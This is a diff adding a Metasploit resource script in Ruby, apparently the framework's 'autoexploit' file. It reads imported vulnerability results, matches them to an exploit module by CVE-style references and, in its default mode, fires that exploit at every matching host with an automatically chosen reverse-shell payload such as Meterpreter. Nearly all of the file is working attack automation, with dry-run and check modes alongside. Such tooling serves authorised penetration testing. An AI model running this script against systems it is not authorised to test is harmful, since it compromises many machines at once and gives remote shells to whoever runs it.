@@ -1,0 +1,263 @@
+<ruby>
+#
+# Print the help function
+#
+def help_me
+	help = %Q|
+	Description:
+		This Metasploit RC file can be used to automate the exploitation process.  Before using the
+		script, you must import your vulnerability results to Metasploit so that it can deploy the
+		module based on matching references. Three modes are available: exploit/dry/and check.
+		In exploit mode, it will attempt to gain access to all vulnerable hosts with the most
+		suitable reverse shell that's automatically selected.  In "dry" mode (dry-run), it'll list
+		all the hosts vulnerable to the exploit.  In check mode, it will only trigger the check()
+		function found in the module.  If no mode is specified, then it'll default to 'exploit'.
+
+	Usage:
+		./msfconsole -r [rc_path] [db_user] [db_pass] [db_workspace] [module_path] [mode]
+
+	Arguments:
+		rc_path      - Full path to the RC script
+		db_user      - Username for MSF database           (datastore: 'DB_USER')
+		db_pass      - Password for MSF database           (datastore: 'DB_PASS')
+		db_worksapce - Workspace for the database          (datastore: 'DB_WORKSPACE')
+		module_path  - Path to the exploit                 (datastore: 'MODULE')
+		mode         - Optional. Accept:exploit/dry/check  (datastore: 'MODE')
+
+	Example of running an exploit:
+		msfconsole -r autoexploit.rc username password msf windows/smb/ms08_067_netapi
+
+	Authors:
+		sinn3r  <sinn3r[at]metasploit.com>
+		m-1-k-3 <m1k3[at]s3cur1ty.de>
+	|
+
+	help = help.gsub(/^\t/, '')
+	print_line(help)
+end
+
+
+#
+# Load an exploit
+#
+def load_exploit(path)
+	framework.exploits.create(path)
+end
+
+
+#
+# See if there is a match for the exploit
+#
+def ref_has_match(vuln_refs, exp_refs)
+	# exp_refs is an array of URLs
+	# vuln_refs is a collection of Mdm::Ref, with 'name' being the most useful info
+	# (may contain a link)
+	vuln_refs.each do |ref|
+		n = ref.name
+		n = n.gsub(/^CVE\-/, '')
+		n = n.gsub(/^OSVDB\-/, '')
+		n = n.gsub(/^MSB\-/, '')
+		n = n.gsub(/^EDB-/, '')
+
+		exp_refs.each { |e| return true if e.to_s =~ /#{n}/ }
+	end
+
+	return false
+end
+
+
+#
+# Automatically select a payload in this order:
+# Windows meterpreter, linux, osx, php, java, generic
+#
+def select_payload(exploit)
+	windows = 'windows/meterpreter/reverse_tcp'
+	linux   = 'linux/x86/reverse_tcp'
+	osx     = 'osx/x86/shell_reverse_tcp'
+	php     = 'php/meterpreter_reverse_tcp'
+	multi   = 'java/meterpreter/reverse_tcp'
+	generic = 'generic/shell_reverse_tcp'
+
+	payloads = []
+	exploit.compatible_payloads.each do |p|
+		payloads << p[0]
+	end
+
+	if payloads.include?(windows)
+		return windows
+	elsif payloads.include?(linux)
+		return linux
+	elsif payloads.include?(php)
+		return php
+	elsif payloads.include?(multi)
+		return multi
+	elsif payloads.include?(generic)
+		return generic
+	else
+		# WTF? This exploit supports NONE of our favorite payloads?
+		# What kinda BS is this?
+		return nil
+	end
+end
+
+
+#
+# Connect to the database
+#
+def init_db(username, password, workspace)
+	if username.empty? or password.empty?
+		raise ArgumentError, "You must have a credential to connect to your database"
+	end
+
+	print_status("Connecting to database: #{workspace}")
+	run_single("db_connect #{username}:#{password}@localhost:5432/#{workspace}")
+end
+
+
+#
+# Exploit mode
+#
+def auto_exploit(module_path)
+	exploit = load_exploit(module_path)
+	raise RuntimeError, "Exploit not found: #{module_path}" if exploit.nil?
+
+	exploit_refs = exploit.references
+
+	get_payload = select_payload(exploit)
+	lhost       = Rex::Socket.source_address('50.50.50.50')
+
+	if get_payload.nil?
+		raise RuntimeError, "No payload selected for this exploit"
+	else
+		print_status("Payload selected: #{get_payload} (lhost=#{lhost})")
+	end
+
+	framework.db.workspace.vulns.each do |vuln|
+		next if not ref_has_match(vuln.refs, exploit_refs)
+		print_good("Using #{exploit.shortname} against host #{vuln.host.address.to_s}")
+		run_single("use #{exploit.fullname}")
+		run_single("set RHOST #{vuln.host.address.to_s}")
+		run_single("set payload #{get_payload}")
+		run_single("set lhost #{lhost}")
+		run_single("exploit -z")
+		select(nil, nil, nil, 1)
+		run_single("back")
+	end
+end
+
+
+#
+# Dry-run mode
+#
+def dry_run(module_path)
+	exploit = load_exploit(module_path)
+	raise RuntimeError, "Exploit not found: #{module_path}" if exploit.nil?
+
+	exploit_refs = exploit.references
+
+	framework.db.workspace.vulns.each do |vuln|
+		next if not ref_has_match(vuln.refs, exploit_refs)
+		addr = vuln.host.address.to_s
+		print_good("#{addr} has a matching reference to #{exploit.shortname}")
+	end
+end
+
+
+#
+# Check mode
+#
+def check_exploit(module_path)
+	exploit = load_exploit(module_path)
+	raise RuntimeError, "Exploit not found: #{module_path}" if exploit.nil?
+
+	exploit_refs = exploit.references
+
+	framework.db.workspace.vulns.each do |vuln|
+		next if not ref_has_match(vuln.refs, exploit_refs)
+		print_good("Checking #{exploit.shortname} against host #{vuln.host.address.to_s}")
+		run_single("use #{exploit.fullname}")
+		run_single("set RHOST #{vuln.host.address.to_s}")
+		run_single("check")
+		select(nil, nil, nil, 1)
+		run_single("back")
+		print_line()
+	end
+end
+
+
+#
+# See if we're already connected
+#
+def is_db_connected?
+	begin
+		framework.db.hosts
+		return true
+	rescue ::ActiveRecord::ConnectionNotEstablished
+		return false
+	end
+end
+
+
+#
+# Initialize our arguments
+#
+def init_args
+	args = {}
+	if ARGV.join('') =~ /^help$/i
+		args[:help] = true
+		return args
+	end
+
+	datastore           = framework.datastore
+	args[:db_user]      = ARGV.shift || datastore['DB_USER'] || ''
+	args[:db_pass]      = ARGV.shift || datastore['DB_PASS'] || ''
+	args[:db_workspace] = ARGV.shift || datastore['DB_WORKSPACE'] || ''
+	args[:module]       = ARGV.shift || datastore['MODULE'] || ''
+	args[:mode]         = ARGV.shift || datastore['MODE'] || 'exploit'
+
+	raise ArgumentError, "Missing a module path" if args[:module].empty?
+
+	return args
+end
+
+
+#
+# Code below serves as our "main" code.
+# We chose not to wrap it around in a run() function, because if
+# we do, any "return" will exit msfconsole, and we don't actually want that
+# to happen.
+#
+begin
+	args = init_args
+	if args[:help]
+		help_me
+		return
+	else
+		if not is_db_connected?
+			init_db(args[:db_user], args[:db_pass], args[:db_workspace])
+		end
+	end
+
+	case args[:mode]
+	when /^exploit$/i
+		auto_exploit(args[:module])
+	when /^dry$/i
+		dry_run(args[:module])
+	when /^check$/i
+		check_exploit(args[:module])
+	else
+		raise ArgumentError, "Invalid mode"
+	end
+
+rescue ArgumentError => e
+	print_error("Invalid argument: #{e.message}")
+	return
+
+rescue RuntimeError => e
+	print_error(e.message)
+	return
+
+rescue ::Exception => e
+	raise e
+end
+</ruby>
